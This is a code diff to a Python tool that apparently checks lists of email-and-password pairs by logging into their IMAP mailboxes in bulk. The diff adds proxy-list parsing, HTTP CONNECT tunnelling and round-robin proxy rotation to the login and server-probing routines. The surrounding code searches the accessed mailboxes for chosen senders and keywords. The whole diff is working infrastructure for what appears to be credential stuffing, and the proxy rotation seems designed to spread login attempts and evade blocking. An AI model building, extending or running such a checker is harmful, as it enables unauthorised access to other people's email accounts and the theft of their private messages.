@@ -96,38 +96,54 @@ def create_proxy_tunnel(proxy_host, proxy_port, proxy_user, proxy_pass, target_h
     return sock
 
 
-def imap_via_proxy(proxy_config, server, port, use_ssl=True):
-    """Create IMAP connection through proxy. Returns imaplib.IMAP4 or IMAP4_SSL instance."""
+class _ProxiedIMAP4(imaplib.IMAP4):
+    """IMAP4 that uses a pre-connected socket (e.g. from an HTTP CONNECT tunnel)."""
+    def __init__(self, sock, host='', port=143):
+        self._presock = sock
+        super().__init__(host, port)
+
+    def open(self, host='', port=143, timeout=None):
+        self.host = host
+        self.port = port
+        self.sock = self._presock
+        self.file = self.sock.makefile('rb')
+
+
+def imap_via_proxy(proxy_config, server, port, use_ssl=True, timeout=10):
+    """Create IMAP connection, optionally through proxy.
+
+    Works for both direct and proxied connections. For proxied connections,
+    uses _ProxiedIMAP4 with a pre-connected tunnel socket.
+    """
     if not proxy_config:
-        # Direct connection
-        if port == 993 and use_ssl:
-            return imaplib.IMAP4_SSL(server, port)
+        # Direct connection (no proxy)
+        if port == 993 and use_ssl is not False:
+            return imaplib.IMAP4_SSL(server, port, timeout=timeout)
+        elif use_ssl is False:
+            return imaplib.IMAP4(server, port, timeout=timeout)
         else:
-            m = imaplib.IMAP4(server, port)
-            if use_ssl:
-                m.starttls()
+            m = imaplib.IMAP4(server, port, timeout=timeout)
+            m.starttls()
             return m
 
-    # Tunneled connection
+    # Proxied connection via HTTP CONNECT tunnel
+    is_ssl = (port == 993 and use_ssl is not False)
     tunnel_sock = create_proxy_tunnel(
-        proxy_config["host"], proxy_config["port"],
+        proxy_config["host"], int(proxy_config["port"]),
         proxy_config.get("user", ""), proxy_config.get("pass", ""),
-        server, port, use_ssl=(port == 993 and use_ssl)
+        server, port, use_ssl=is_ssl
     )
+    tunnel_sock.settimeout(timeout)
 
-    if port == 993 and use_ssl:
-        m = imaplib.IMAP4_SSL(server, port)
-        m.shutdown()  # Close original socket
-        m.sock = tunnel_sock
-        m.file = m.sock.makefile('rb')
-        return m
+    if is_ssl:
+        # Socket already SSL-wrapped by create_proxy_tunnel
+        return _ProxiedIMAP4(tunnel_sock, server, port)
+    elif use_ssl is False:
+        return _ProxiedIMAP4(tunnel_sock, server, port)
     else:
-        m = imaplib.IMAP4(server, port)
-        m.shutdown()
-        m.sock = tunnel_sock
-        m.file = m.sock.makefile('rb')
-        if use_ssl:
-            m.starttls()
+        # STARTTLS: connect plain first, then upgrade
+        m = _ProxiedIMAP4(tunnel_sock, server, port)
+        m.starttls()
         return m
 
 
@@ -202,6 +218,56 @@ def parse_senders(text):
         if line and not line.startswith("#"):
             senders.append(line)
     return senders
+
+
+def parse_proxies(text):
+    """Parse proxy list from text. Supports formats:
+    - user:pass@host:port
+    - host:port:user:pass
+    - host:port (no auth)
+    One proxy per line.
+    """
+    proxies = []
+    for line in text.strip().splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        proxy = _parse_single_proxy(line)
+        if proxy:
+            proxies.append(proxy)
+    return proxies
+
+
+def _parse_single_proxy(line):
+    """Parse a single proxy line into {host, port, user, pass}."""
+    # Format 1: user:pass@host:port
+    if '@' in line:
+        auth_part, server_part = line.rsplit('@', 1)
+        if ':' in auth_part and ':' in server_part:
+            user, password = auth_part.split(':', 1)
+            host, port_str = server_part.rsplit(':', 1)
+            try:
+                return {"host": host, "port": int(port_str), "user": user, "pass": password}
+            except ValueError:
+                return None
+
+    parts = line.split(':')
+    # Format 2: host:port:user:pass
+    if len(parts) >= 4:
+        try:
+            port = int(parts[1])
+            return {"host": parts[0], "port": port, "user": parts[2], "pass": ':'.join(parts[3:])}
+        except ValueError:
+            pass
+
+    # Format 3: host:port (no auth)
+    if len(parts) == 2:
+        try:
+            return {"host": parts[0], "port": int(parts[1]), "user": "", "pass": ""}
+        except ValueError:
+            pass
+
+    return None
 
 
 def sender_matches(from_address, target_senders):
@@ -536,7 +602,7 @@ def _escape_imap_string(s: str) -> str:
 
 
 class ImapChecker:
-    def __init__(self, job_id, results_dir, accounts, target_senders=None, keywords=None, search_days=365, max_threads=20, proxy_config=None):
+    def __init__(self, job_id, results_dir, accounts, target_senders=None, keywords=None, search_days=365, max_threads=20, proxy_config=None, proxy_list=None):
         self.job_id = job_id
         self.results_dir = results_dir
         self.accounts = accounts
@@ -544,7 +610,16 @@ class ImapChecker:
         self.keywords = keywords or []
         self.search_days = search_days
         self.max_threads = max_threads
-        self.proxy_config = proxy_config  # {"host": ..., "port": ..., "user": ..., "pass": ...}
+
+        # Proxy: support both single proxy_config (backward compat) and proxy_list
+        if proxy_list:
+            self.proxy_list = proxy_list
+        elif proxy_config:
+            self.proxy_list = [proxy_config]
+        else:
+            self.proxy_list = []
+        self._proxy_idx = 0
+        self._proxy_idx_lock = threading.Lock()
 
         self.search_since_date = (datetime.now() - timedelta(days=search_days)).strftime('%d-%b-%Y')
 
@@ -618,6 +693,15 @@ class ImapChecker:
 
         # Status: idle, running, done, stopped
         self.status = "idle"
+
+    def _get_proxy(self):
+        """Get next proxy from the list (round-robin). Returns None if no proxies."""
+        if not self.proxy_list:
+            return None
+        with self._proxy_idx_lock:
+            proxy = self.proxy_list[self._proxy_idx % len(self.proxy_list)]
+            self._proxy_idx += 1
+            return proxy
 
     def stop(self):
         """Force stop: immediately set status, drain queue, stop all workers."""
@@ -784,7 +868,7 @@ class ImapChecker:
 
         return data
 
-    def _try_imap_variants(self, domain, email_address, password):
+    def _try_imap_variants(self, domain, email_address, password, proxy=None):
         if self.is_stopped:
             return None
         methods = [(993, "ssl"), (143, "starttls"), (143, "plain")]
@@ -796,28 +880,8 @@ class ImapChecker:
             for port, method in methods:
                 server = f"{prefix}.{domain}" if prefix else domain
                 try:
-                    if self.proxy_config:
-                        use_ssl = method in ("ssl", "starttls")
-                        tunnel_sock = create_proxy_tunnel(
-                            self.proxy_config["host"], self.proxy_config["port"],
-                            self.proxy_config.get("user", ""), self.proxy_config.get("pass", ""),
-                            server, port, use_ssl=(method == "ssl")
-                        )
-                        if method == "ssl":
-                            m = imaplib.IMAP4_SSL(host=server, port=port, timeout=10)
-                        elif method == "starttls":
-                            m = imaplib.IMAP4(host=server, port=port, timeout=10)
-                            m.starttls()
-                        else:
-                            m = imaplib.IMAP4(host=server, port=port, timeout=10)
-                    else:
-                        if method == "ssl":
-                            m = imaplib.IMAP4_SSL(server, port, timeout=10)
-                        elif method == "starttls":
-                            m = imaplib.IMAP4(server, port, timeout=10)
-                            m.starttls()
-                        else:
-                            m = imaplib.IMAP4(server, port, timeout=10)
+                    use_ssl = True if method != "plain" else False
+                    m = imap_via_proxy(proxy, server, port, use_ssl=use_ssl)
                     m.login(email_address, password)
                     m.logout()
                     result = {"server": server, "port": port}
@@ -844,6 +908,9 @@ class ImapChecker:
                 queue.task_done()
                 break
 
+            # Get proxy for this account (round-robin rotation)
+            proxy = self._get_proxy()
+
             # Skip domain
             if any(kw in domain for kw in self.skip_domain_keywords):
                 self._write_domain_skip(email_addr, password)
@@ -862,7 +929,7 @@ class ImapChecker:
                 imap_cfg = {"server": "mail.twc.com", "port": 143, "ssl": False}
 
             if not imap_cfg and domain not in self.unreg_domains:
-                result = self._try_imap_variants(domain, email_addr, password)
+                result = self._try_imap_variants(domain, email_addr, password, proxy=proxy)
                 if result:
                     self._update_imap_config(domain, result)
                     imap_cfg = result
@@ -877,21 +944,9 @@ class ImapChecker:
                 queue.task_done()
                 continue
 
-            def try_connect(cfg):
+            def try_connect(cfg, px=proxy):
                 use_ssl = cfg.get('ssl', True)
-                if self.proxy_config:
-                    tunnel_sock = create_proxy_tunnel(
-                        self.proxy_config["host"], self.proxy_config["port"],
-                        self.proxy_config.get("user", ""), self.proxy_config.get("pass", ""),
-                        cfg['server'], cfg['port'], use_ssl=(cfg['port'] == 993 and use_ssl is not False)
-                    )
-                if cfg['port'] == 993 and use_ssl is not False:
-                    m = imaplib.IMAP4_SSL(cfg['server'], cfg['port'], timeout=10)
-                elif use_ssl is False:
-                    m = imaplib.IMAP4(cfg['server'], cfg['port'], timeout=10)
-                else:
-                    m = imaplib.IMAP4(cfg['server'], cfg['port'], timeout=10)
-                    m.starttls()
+                m = imap_via_proxy(px, cfg['server'], cfg['port'], use_ssl=use_ssl)
                 m.login(email_addr, password)
                 return m
 
@@ -901,7 +956,7 @@ class ImapChecker:
                     mail_conn = try_connect(imap_cfg)
                     self._update_imap_config(domain, imap_cfg)
                 except Exception:
-                    fallback = self._try_imap_variants(domain, email_addr, password)
+                    fallback = self._try_imap_variants(domain, email_addr, password, proxy=proxy)
                     if not fallback:
                         raise
                     self._update_imap_config(domain, fallback)
